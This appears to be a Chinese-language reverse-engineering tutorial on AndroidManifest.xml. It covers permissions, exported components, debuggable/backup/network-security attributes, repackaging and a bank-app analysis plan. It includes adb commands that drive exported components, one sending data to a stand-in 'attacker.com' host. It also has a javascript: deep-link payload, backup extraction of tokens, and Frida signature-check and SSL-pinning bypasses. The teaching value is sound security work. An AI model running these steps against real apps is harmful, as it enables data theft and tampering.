---
title: "AndroidManifest.xml 深度解析"
date: 2024-06-01
type: posts
tags: ["SSL Pinning", "Hook", "基础知识", "Smali", "Android", "DEX"]
weight: 10
---

# AndroidManifest.xml 深度解析

`AndroidManifest.xml` 是 Android 应用的"大脑"和"蓝图"。它是一个强制性的配置文件，位于每个 APK 的根目录中。该文件向 Android 构建工具、操作系统和 Google Play 描述了应用的基本信息、组件、权限和硬件要求。对于逆向工程师来说，这是了解应用功能、入口点和安全边界的首要切入点。

---

## 1. Manifest 结构详解

### 1.1 完整元素层次结构

```xml
<manifest>                          ← 根元素，定义包名和版本
    │
    ├── <uses-permission />         ← 请求系统权限
    ├── <permission />              ← 定义自定义权限
    ├── <uses-feature />            ← 声明硬件/软件需求
    ├── <uses-sdk />                ← 最低/目标 SDK 版本
    │
    └── <application>               ← 应用级配置和组件容器
            │
            ├── <activity>          ← 界面组件
            │       └── <intent-filter>
            │               ├── <action />
            │               ├── <category />
            │               └── <data />
            ├── <service>           ← 后台服务
            ├── <receiver>          ← 广播接收器
            ├── <provider>          ← 内容提供器
            │       ├── <grant-uri-permission />
            │       └── <path-permission />
            ├── <meta-data />       ← 键值对元数据
            └── <uses-library />    ← 依赖的共享库
```

### 1.2 逆向分析中最关注的属性

| 优先级 | 属性/元素 | 逆向价值 |
|--------|----------|---------|
| 最高 | `<application android:name>` | Application 子类，壳的入口 |
| 最高 | MAIN/LAUNCHER Activity | 应用的启动入口 |
| 最高 | `android:debuggable` | 是否可以附加调试器 |
| 高 | `android:exported="true"` | 攻击面 -- 外部可访问的组件 |
| 高 | `<uses-permission>` | 应用能力的快速画像 |
| 高 | `android:networkSecurityConfig` | SSL Pinning 配置 |
| 中 | `android:allowBackup` | 是否允许数据备份导出 |
| 中 | `android:process` | 多进程架构，影响 Hook 策略 |
| 中 | `<provider android:authorities>` | 数据接口，可能存在注入 |
| 中 | Deep Link (`<data>` 标签) | URL Scheme 攻击面 |
| 低 | `<meta-data>` | SDK 配置，可能包含 API Key |

### 1.3 二进制 Manifest 的解码

APK 中的 `AndroidManifest.xml` 是 AXML 二进制格式，不能直接阅读：

```bash
# 方法 1: apktool 解码（推荐，同时解码资源）
apktool d target.apk -o target_decoded
cat target_decoded/AndroidManifest.xml

# 方法 2: aapt 快速查看（不解包）
aapt dump xmltree target.apk AndroidManifest.xml

# 方法 3: jadx 反编译时自动解码
jadx target.apk -d output_dir

# 方法 4: androguard (Python)
python3 -c "
from androguard.core.apk import APK
a = APK('target.apk')
print(a.get_android_manifest_xml().toprettyxml())
"
```

---

## 2. 权限分析

### 2.1 权限分类

| 保护级别 | 说明 | 逆向意义 |
|---------|------|---------|
| `normal` | 低风险，安装时自动授予 | 基本能力（震动、网络状态） |
| `dangerous` | 高风险，需运行时授权 | 核心功能指标（相机、位置、存储） |
| `signature` | 仅同签名应用可获得 | 系统级功能或应用间私有通信 |

### 2.2 从权限推测应用行为

```xml
<!-- 典型的间谍软件权限配置 -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
```

**权限行为速查表**:

| 权限 | 行为推测 | 逆向关注点 |
|------|---------|-----------|
| `INTERNET` | 网络通信 | 抓包分析，API 逆向 |
| `READ_SMS` / `RECEIVE_SMS` | 读取/拦截短信 | 验证码窃取 |
| `ACCESS_FINE_LOCATION` | 精确定位 | 位置上报逻辑 |
| `CAMERA` | 摄像头 | 偷拍、人脸识别 |
| `RECORD_AUDIO` | 录音 | 监听、语音识别 |
| `READ_CONTACTS` | 读取通讯录 | 数据泄露、社工收集 |
| `RECEIVE_BOOT_COMPLETED` | 开机自启 | 持久化驻留机制 |
| `SYSTEM_ALERT_WINDOW` | 悬浮窗 | 钓鱼覆盖攻击 |
| `REQUEST_INSTALL_PACKAGES` | 安装应用 | 静默安装恶意软件 |
| `BIND_ACCESSIBILITY_SERVICE` | 无障碍服务 | 自动点击、窃取界面内容 |

### 2.3 自定义权限分析

```xml
<!-- 定义自定义权限 -->
<permission
    android:name="com.example.app.permission.ACCESS_INTERNAL_API"
    android:protectionLevel="signature" />

<!-- 使用自定义权限保护组件 -->
<service android:name=".service.InternalApiService"
         android:permission="com.example.app.permission.ACCESS_INTERNAL_API"
         android:exported="true" />
```

`protectionLevel="signature"` 意味着只有相同签名的应用才能访问。如果是 `normal` 或 `dangerous`，任何应用都可能获取该权限。

```bash
# 提取权限列表
aapt dump permissions target.apk

# 查看已授予的权限
adb shell dumpsys package com.example.app | grep "granted=true"
```

---

## 3. 组件导出分析

### 3.1 exported 属性规则

```text
exported 判定规则:
┌──────────────────────────────────────────────────────┐
│  显式 exported="true"    → 可被外部访问               │
│  显式 exported="false"   → 不可被外部访问             │
│                                                      │
│  未声明时:                                            │
│    有 <intent-filter>  → 默认 exported="true"         │
│    无 <intent-filter>  → 默认 exported="false"        │
│                                                      │
│  Android 12+ (targetSdk >= 31):                      │
│    有 intent-filter 必须显式声明，否则安装失败         │
└──────────────────────────────────────────────────────┘
```

### 3.2 攻击面映射

```xml
<!-- 存在多个导出组件的应用 -->
<application>
    <!-- 风险: 无权限保护的管理界面 -->
    <activity android:name=".AdminActivity" android:exported="true" />

    <!-- 风险: 可被恶意绑定的 Service -->
    <service android:name=".DataSyncService" android:exported="true">
        <intent-filter>
            <action android:name="com.example.vulnerable.SYNC" />
        </intent-filter>
    </service>

    <!-- 风险: 接收恶意广播 -->
    <receiver android:name=".CommandReceiver" android:exported="true">
        <intent-filter>
            <action android:name="com.example.vulnerable.EXECUTE" />
        </intent-filter>
    </receiver>

    <!-- 风险: 数据泄露 -->
    <provider android:name=".UserDataProvider"
              android:authorities="com.example.vulnerable.userdata"
              android:exported="true" />
</application>
```

### 3.3 使用 adb 测试导出组件

```bash
# 测试导出的 Activity
adb shell am start -n com.example.vulnerable/.AdminActivity \
    --es action "delete_all_users"

# 测试导出的 Service
adb shell am startservice \
    -a "com.example.vulnerable.SYNC" \
    --es target "http://attacker.com/collect"

# 测试导出的 Receiver
adb shell am broadcast \
    -a "com.example.vulnerable.EXECUTE" \
    --es command "dump_database"

# 测试导出的 ContentProvider
adb shell content query \
    --uri content://com.example.vulnerable.userdata/users
```

### 3.4 intent-filter 的安全隐患

有 `<intent-filter>` 的组件会隐式变为 `exported="true"`：

```xml
<!-- 开发者可能只想接收内部广播，但实际上是导出的 -->
<receiver android:name=".InternalCommandReceiver">
    <intent-filter>
        <action android:name="com.example.app.INTERNAL_ACTION" />
    </intent-filter>
    <!-- 应添加 android:exported="false" -->
</receiver>

<!-- Deep Link 攻击面 -->
<activity android:name=".WebViewActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="myapp" android:host="webview" />
    </intent-filter>
</activity>
<!-- 攻击: myapp://webview?url=javascript:alert(1)
     如果未校验 URL，可能导致 XSS 或任意网页加载 -->
```

---

## 4. Application 属性

### 4.1 安全关键属性

```xml
<application
    android:name=".MyApplication"
    android:debuggable="false"
    android:allowBackup="false"
    android:networkSecurityConfig="@xml/network_security_config"
    android:usesCleartextTraffic="false"
    android:extractNativeLibs="true">
```

### 4.2 debuggable 属性

| debuggable="true" | debuggable="false" |
|---|---|
| 可使用 JDWP 附加调试器 | 无法直接 JDWP 调试 |
| `run-as <package>` 可访问私有目录 | run-as 不可用 |
| 所有级别日志输出 | 部分日志被过滤 |

**绕过方法**:
1. 修改 Manifest 添加 `debuggable=true` 后重打包
2. 使用 Magisk + `ro.debuggable=1`
3. 使用 Frida（不依赖 debuggable 属性）

```bash
# 检查是否可调试
adb shell dumpsys package com.example.app | grep "flags="

# run-as 访问私有目录（需 debuggable=true）
adb shell run-as com.example.app ls shared_prefs/
```

### 4.3 allowBackup 属性

```bash
# allowBackup="true" 时可以导出应用数据
adb backup -f backup.ab -noapk com.example.app

# 转换并解压
java -jar abe.jar unpack backup.ab backup.tar ""
tar xvf backup.tar
# 可获取: shared_prefs/(Token/密钥)、databases/、files/
```

### 4.4 networkSecurityConfig

```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <!-- 全局: 禁止明文 -->
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>

    <!-- SSL Pinning -->
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2025-12-31">
            <pin digest="SHA-256">AAAAAAAAAAAAA=</pin>
        </pin-set>
    </domain-config>

    <!-- 调试时信任用户证书 -->
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

**绕过 SSL Pinning**:
1. 修改配置文件，在 `<base-config>` 中添加 `<certificates src="user" />`
2. 配合 `debuggable=true` 利用 `debug-overrides`
3. Frida Hook `TrustManager` / `SSLContext`
4. Objection: `android sslpinning disable`

### 4.5 usesCleartextTraffic

当此属性为 `false`（Android 9+ 默认），所有 HTTP 请求被拦截。逆向抓包时需改为 `true`。

---

## 5. 多进程分析

### 5.1 android:process 属性

```xml
<application android:name=".MyApplication">
    <!-- 默认进程: com.example.app -->
    <activity android:name=".MainActivity" />

    <!-- 私有子进程: com.example.app:push -->
    <service android:name=".PushService" android:process=":push" />

    <!-- 私有子进程: com.example.app:crypto -->
    <service android:name=".CryptoService" android:process=":crypto" />
</application>
```

```text
多进程架构:
  PID 12345: com.example.app        ← 主进程 (MyApplication 实例 #1)
  PID 12346: com.example.app:push   ← 推送进程 (MyApplication 实例 #2)
  PID 12347: com.example.app:crypto ← 加密进程 (MyApplication 实例 #3)
  注意: 每个进程都会重新创建 Application 实例!
```

### 5.2 多进程对 Hook 的影响

```bash
# Frida 默认只 attach 主进程，需要指定子进程
frida-ps -U | grep com.example
#   12345  com.example.app
#   12346  com.example.app:push
#   12347  com.example.app:crypto

# attach 到子进程
frida -U -n "com.example.app:crypto" -l hook.js
```

```javascript
// 在脚本中判断当前进程
Java.perform(function() {
    var proc = Java.use("android.app.ActivityThread").currentProcessName();
    console.log("[*] 当前进程: " + proc);
    if (proc.indexOf(":crypto") !== -1) {
        hookCryptoMethods();
    }
});
```

**重要**: 很多应用在 Application 中判断进程名来决定初始化逻辑，可能导致某些 Hook 在子进程中不生效。

---

## 6. Manifest 修改与重打包

### 6.1 修改流程

```bash
# Step 1: 解包
apktool d target.apk -o target_decoded

# Step 2: 修改 AndroidManifest.xml
# 添加/修改: debuggable="true", allowBackup="true",
#            usesCleartextTraffic="true"

# Step 3: (可选) 创建 network_security_config.xml 信任用户证书
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

```bash
# Step 4: 重打包 + 对齐 + 签名
apktool b target_decoded -o target_modified.apk
zipalign -v 4 target_modified.apk target_aligned.apk
apksigner sign --ks debug.keystore --ks-pass pass:android target_aligned.apk
adb install -r target_aligned.apk
```

### 6.2 常见修改操作

| 修改目标 | 修改内容 | 用途 |
|---------|---------|------|
| 开启调试 | `debuggable="true"` | 附加调试器 |
| 允许备份 | `allowBackup="true"` | 导出应用数据 |
| 允许明文 | `usesCleartextTraffic="true"` | HTTP 抓包 |
| 信任用户证书 | 修改 networkSecurityConfig | HTTPS 抓包 |
| 导出组件 | `exported="true"` | 直接调用内部组件 |
| 移除权限检查 | 删除 `android:permission` | 绕过权限保护 |

### 6.3 签名校验绕过

重打包后签名改变，很多应用会校验签名一致性：

```javascript
// Frida 绕过签名校验
Java.perform(function() {
    // 方法 1: Hook PackageManager
    var PM = Java.use("android.app.ApplicationPackageManager");
    PM.getPackageInfo.overload("java.lang.String", "int")
        .implementation = function(pkg, flags) {
            if ((flags & 0x40) !== 0) { // GET_SIGNATURES
                console.log("[*] 拦截签名校验");
            }
            return this.getPackageInfo(pkg, flags);
        };

    // 方法 2: 直接 Hook 校验方法
    var Security = Java.use("com.example.app.SecurityCheck");
    Security.checkSignature.implementation = function() {
        console.log("[*] 跳过签名校验");
        return true;
    };
});
```

---

## 7. 从 Manifest 制定逆向策略

### 7.1 分析检查清单

```text
┌────────────────────────────────────────────────────────────┐
│          AndroidManifest.xml 逆向分析检查清单               │
├────────────────────────────────────────────────────────────┤
│ [ ] 1. 基本信息: package, version, minSdk/targetSdk       │
│ [ ] 2. Application: android:name (壳入口)                  │
│ [ ] 3. 安全属性: debuggable, allowBackup, cleartext        │
│ [ ] 4. 网络配置: networkSecurityConfig (SSL Pinning)       │
│ [ ] 5. 入口点: MAIN/LAUNCHER Activity, Deep Link           │
│ [ ] 6. 导出组件: 所有 exported="true" 的组件               │
│ [ ] 7. 权限列表: 识别 dangerous 权限推测功能               │
│ [ ] 8. 多进程: android:process 属性                        │
│ [ ] 9. 元数据: meta-data 中的 SDK 配置和 API Key           │
└────────────────────────────────────────────────────────────┘
```

### 7.2 快速分析脚本

```bash
#!/bin/bash
# manifest_analyzer.sh <AndroidManifest.xml>
MANIFEST=$1

echo "=== 基本信息 ==="
grep -oP 'package="[^"]*"' "$MANIFEST"
grep -oP 'android:versionName="[^"]*"' "$MANIFEST"

echo -e "\n=== Application 类 ==="
grep -oP '<application[^>]*android:name="[^"]*"' "$MANIFEST" | \
    grep -oP 'android:name="[^"]*"'

echo -e "\n=== 安全属性 ==="
grep -oP 'android:debuggable="[^"]*"' "$MANIFEST"
grep -oP 'android:allowBackup="[^"]*"' "$MANIFEST"
grep -oP 'android:usesCleartextTraffic="[^"]*"' "$MANIFEST"
grep -oP 'android:networkSecurityConfig="[^"]*"' "$MANIFEST"

echo -e "\n=== 权限 ==="
grep -oP '<uses-permission android:name="[^"]*"' "$MANIFEST" | \
    sed 's/<uses-permission android:name="//;s/"//'

echo -e "\n=== 导出的组件 ==="
grep -B1 'exported="true"' "$MANIFEST" | grep -oP 'android:name="[^"]*"'

echo -e "\n=== 多进程 ==="
grep -oP 'android:process="[^"]*"' "$MANIFEST"

echo -e "\n=== Deep Links ==="
grep -A3 'android:scheme=' "$MANIFEST"
```

### 7.3 实战案例：金融 App 分析

```xml
<manifest package="com.bank.secureapp">
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="33" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
    <uses-permission android:name="android.permission.CAMERA" />

    <application
        android:name="com.bank.secureapp.BankApplication"
        android:debuggable="false"
        android:allowBackup="false"
        android:networkSecurityConfig="@xml/network_security_config"
        android:usesCleartextTraffic="false">

        <activity android:name=".ui.SplashActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".ui.LoginActivity" />
        <activity android:name=".ui.TransferActivity" />

        <!-- 加密服务在独立进程 -->
        <service android:name=".service.CryptoService"
                 android:process=":secure" />

        <!-- Deep Link 攻击面 -->
        <activity android:name=".ui.DeepLinkActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="bankapp" android:host="transfer" />
            </intent-filter>
        </activity>

        <meta-data android:name="com.firebase.sdk.key"
                   android:value="AIzaSyD..." />
    </application>
</manifest>
```

**制定的逆向计划**:

```text
1. 前期准备:
   debuggable=false → 使用 Frida（不依赖 debuggable）
   networkSecurityConfig → 可能有 SSL Pinning，准备绕过脚本

2. SSL Pinning 绕过:
   Frida 脚本 → 失败则修改 config 重打包

3. 入口分析:
   Application: BankApplication → Hook attachBaseContext() 检查壳
   启动流程: SplashActivity → LoginActivity → 分析登录协议

4. 核心逻辑:
   CryptoService 在 :secure 子进程
   → frida -U -n "com.bank.secureapp:secure" -l hook.js

5. 攻击面:
   Deep Link bankapp://transfer → 测试是否可绕过认证
   Firebase Key 明文泄露 → 检查 Firebase 数据库访问
```

---

## 8. 安全风险与配置

- **组件导出风险**: 将内部组件设为 `exported="true"` 是最常见的 Android 漏洞之一。

- **Webview 风险**: 检查是否使用 `WebView` 并开启了 `setJavaScriptEnabled(true)`，可能导致远程代码执行。

- **File Provider 路径遍历**: `FileProvider` 配置不当可能导致任意文件读取。

- **Intent 重定向**: 导出组件接收 Intent 后用其数据启动另一组件，可能导致未导出组件被间接调用。

- **PendingIntent 劫持**: 使用空白 Intent 创建的 `PendingIntent` 可能被恶意应用劫持。

- **硬编码密钥**: 分析后应在 `res/values/strings.xml` 或代码中寻找硬编码的 API 密钥。

---
